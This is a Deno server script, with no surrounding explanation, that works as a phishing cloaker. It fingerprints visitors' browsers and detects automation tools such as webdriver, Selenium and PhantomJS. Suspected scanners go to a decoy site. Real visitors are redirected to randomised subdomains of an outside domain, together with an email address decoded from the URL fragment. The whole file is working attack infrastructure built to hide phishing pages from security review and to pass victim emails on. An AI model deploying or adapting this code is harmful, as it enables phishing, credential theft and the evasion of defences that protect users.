const PORT = Number(Deno.env.get("PORT") || 8080);
const DECOY_URL = "https://medium.com";
const TOKEN_TTL_MS = 60_000;
const tokens = new Map<string, number>();
const fingerprints = new Map<string, { count: number; first: number }>();

function randomString(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let s = "";
  const bytes = crypto.getRandomValues(new Uint8Array(len));
  for (let i = 0; i < len; i++) s += chars[bytes[i] % chars.length];
  return s;
}

async function hashFingerprint(data: string): Promise<string> {
  const encoder = new TextEncoder();
  const buffer = await crypto.subtle.digest("SHA-256", encoder.encode(data));
  return Array.from(new Uint8Array(buffer))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

setInterval(() => {
  const now = Date.now();
  for (const [t, exp] of tokens.entries()) {
    if (exp < now) tokens.delete(t);
  }
  for (const [fp, data] of fingerprints.entries()) {
    if (now - data.first > 86400000) fingerprints.delete(fp);
  }
}, 10_000);

Deno.serve({ port: PORT }, async (req: Request): Promise<Response> => {
  try {
    const url = new URL(req.url);
    const cookies = req.headers.get("cookie") || "";

    if (url.pathname === "/fp" && req.method === "POST") {
      const body = await req.json();
      const fp = body.fp;
      const token = body.t;

      if (!fp || !token || !tokens.has(token)) {
        return Response.json({ ok: false }, { status: 403 });
      }

      const hash = await hashFingerprint(fp);
      const record = fingerprints.get(hash) || { count: 0, first: Date.now() };
      record.count++;
      fingerprints.set(hash, record);

      if (record.count > 50) {
        return Response.json({ ok: false }, { status: 403 });
      }

      const redirectToken = randomString(16);
      tokens.set(redirectToken, Date.now() + 30_000);
      tokens.delete(token);

      return Response.json({ ok: true, rt: redirectToken });
    }

    if (url.pathname.endsWith(".js")) {
      const noCookie = !cookies.includes("_v=1");
      const noReferer = !req.headers.get("referer");
      const secFetchDest = req.headers.get("sec-fetch-dest") || "";
      const wrongSecFetch = secFetchDest !== "script";
      const token = url.searchParams.get("t");
      const validToken = token && tokens.has(token);
      if (validToken) tokens.delete(token);

      if (noCookie || noReferer || wrongSecFetch || !validToken) {
        return Response.redirect(DECOY_URL, 302);
      }

      const email = url.searchParams.get("email") || "";
      const currentPath = url.searchParams.get("p") || "/";
      const queryString = url.searchParams.get("q") || "";
      const sub = randomString(5);
      const destination =
        `https://file${sub}.equiteqedge.com${currentPath}?q=a` +
        `${queryString ? "&" + queryString : ""}` +
        `${email ? "&email=" + encodeURIComponent(email) : ""}`;

      const js = `window.location.replace('${destination}');`;
      return new Response(js, {
        headers: {
          "Content-Type": "application/javascript",
          "Cache-Control": "no-store, no-cache, must-revalidate, private",
        },
      });
    }

    const token = randomString(16);
    tokens.set(token, Date.now() + TOKEN_TTL_MS);

    const scriptUrl =
      `/${randomString(12)}.js?p=${encodeURIComponent(url.pathname)}` +
      `&q=${encodeURIComponent(url.search.substring(1))}`;

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Please wait...</title>
</head>
<body>
<script>
(async function() {
  const fp = {};
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200; canvas.height = 50;
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 100, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('Cwm fjord veg balks', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('xyz', 4, 17);
    fp.canvas = canvas.toDataURL().slice(-50);
  } catch(e) { fp.canvas = 'err'; }
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : '';
      fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '';
    }
  } catch(e) { fp.webgl = 'err'; }
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioCtx.createOscillator();
    const analyser = audioCtx.createAnalyser();
    const gain = audioCtx.createGain();
    gain.gain.value = 0;
    oscillator.type = 'triangle';
    oscillator.connect(analyser);
    analyser.connect(gain);
    gain.connect(audioCtx.destination);
    oscillator.start(0);
    const bins = new Float32Array(analyser.frequencyBinCount);
    analyser.getFloatFrequencyData(bins);
    fp.audio = bins.slice(0, 30).reduce((a, b) => a + Math.abs(b), 0).toFixed(2);
    oscillator.stop();
    audioCtx.close();
  } catch(e) { fp.audio = 'err'; }
  fp.screen = [screen.width, screen.height, screen.colorDepth, window.devicePixelRatio].join(',');
  fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.timezoneOffset = new Date().getTimezoneOffset();
  fp.language = navigator.language;
  fp.languages = (navigator.languages || []).join(',');
  fp.platform = navigator.platform;
  fp.cores = navigator.hardwareConcurrency || 0;
  fp.memory = navigator.deviceMemory || 0;
  fp.touch = navigator.maxTouchPoints || 0;
  fp.plugins = Array.from(navigator.plugins || []).map(p => p.name).slice(0, 5).join(',');
  fp.webdriver = navigator.webdriver ? 1 : 0;
  fp.phantom = window._phantom || window.phantom ? 1 : 0;
  fp.nightmare = window.__nightmare ? 1 : 0;
  fp.selenium = document.__selenium_unwrapped || document.__webdriver_evaluate ? 1 : 0;
  fp.cdc = document.documentElement.getAttribute('cdc_asdjflasutopfhvcZLmcfl_') ? 1 : 0;
  const fpString = Object.entries(fp).map(([k,v]) => k + ':' + v).join('|');
  const cleanedHash = location.hash.slice(1);
  const match = cleanedHash.match(/Family=([A-Za-z0-9+/=]+)/);
  let decodedEmail = "";
  if (match && match[1]) { try { decodedEmail = atob(match[1]); } catch(e){} }
  const res = await fetch('/fp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ fp: fpString, t: '${token}' })
  });
  const data = await res.json();
  if (data.ok && data.rt) {
    const s = document.createElement('script');
    s.src = '${scriptUrl}&t=' + data.rt + '&email=' + encodeURIComponent(decodedEmail);
    document.body.appendChild(s);
  } else {
    window.location.replace('${DECOY_URL}');
  }
})();
</script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate, private",
        "Set-Cookie": "_v=1; Path=/; HttpOnly; SameSite=Strict; Max-Age=30",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
      },
    });
  } catch {
    return new Response("Error", { status: 500 });
  }
});

console.log(`Server running on port ${PORT}`);
